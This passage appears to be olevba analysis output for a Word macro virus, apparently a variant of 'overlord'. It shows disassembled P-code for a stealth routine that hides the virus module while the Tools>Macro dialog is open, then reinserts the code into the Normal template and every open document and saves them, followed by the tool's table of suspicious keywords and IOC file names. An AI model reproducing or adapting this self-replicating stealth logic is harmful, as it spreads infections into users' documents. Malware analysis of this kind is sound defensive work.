' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #171:
' 	EndIfBlock 
' Line #172:
' Line #173:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ShowVisualBasicEditor 
' Line #174:
' Line #175:
' 	EndSub 
' Line #176:
' 	FuncDefn (Sub ToolsMacro())
' Line #177:
' 	Dim 
' 	VarDefn x
' 	VarDefn y
' 	VarDefn codent
' 	VarDefn docnumber
' 	VarDefn codead
' Line #178:
' Line #179:
' 	OnError (Resume Next) 
' Line #180:
' Line #181:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #182:
' 	Ld codent 
' 	Ld x 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St codent 
' Line #183:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #184:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #185:
' 	LitVarSpecial (True)
' 	Ld NormalTemplate 
' 	MemSt Saved 
' Line #186:
' Line #187:
' 	Ld Application 
' 	MemLd Documents 
' 	MemLd Count 
' 	St docnumber 
' Line #188:
' 	Ld docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #189:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	For 
' Line #190:
' 	Ld codead 
' 	Ld y 
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	St codead 
' Line #191:
' 	StartForVariable 
' 	Ld y 
' 	EndForVariable 
' 	NextVar 
' Line #192:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld docnumber 
' 	For 
' Line #193:
' 	LitDI2 0x0001 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall deletelines 0x0002 
' Line #194:
' 	LitVarSpecial (True)
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemSt Saved 
' Line #195:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #196:
' 	EndIfBlock 
' Line #197:
' Line #198:
' 	Ld wdDialogToolsMacro 
' 	Ld Application 
' 	ArgsMemLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #199:
' Line #200:
' 	Ld Application 
' 	MemLd ShowVisualBasicEditor 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #201:
' 	LitDI2 0x0001 
' 	Ld codent 
' 	LitStr 0x0006 "Module"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #202:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #203:
' Line #204:
' 	Ld docnumber 
' 	LitDI2 0x0001 
' 	Ge 
' 	IfBlock 
' Line #205:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld docnumber 
' 	For 
' Line #206:
' 	LitDI2 0x0001 
' 	Ld codead 
' 	LitStr 0x0006 "Module"
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #207:
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	MemLd FullName 
' 	Ld x 
' 	ArgsLd Documents 0x0001 
' 	ArgsMemCall SaveAs 0x0001 
' Line #208:
' 	StartForVariable 
' 	Ld x 
' 	EndForVariable 
' 	NextVar 
' Line #209:
' 	EndIfBlock 
' Line #210:
' 	EndIfBlock 
' Line #211:
' 	EndSub 
' Line #212:
' Line #213:
' 	QuoteRem 0x0000 0x004F "Put this code in a module called "Module". This is another version of overlord."
' Line #214:
' 	QuoteRem 0x0000 0x0049 "It uses a different stealth mechanism. Again however not perfect stealth,"
' Line #215:
' 	QuoteRem 0x0000 0x002A "but perhaps also a nice attempt i hope :)."
' Line #216:
' Line #217:
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|FileCopy            |May copy a file                              |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |tempad.dll          |Executable file name                         |
|IOC       |tempnt.dll          |Executable file name                         |
|IOC       |b.vbs               |Executable file name                         |
|IOC       |b.dll               |Executable file name                         |
|IOC       |himem.dll           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

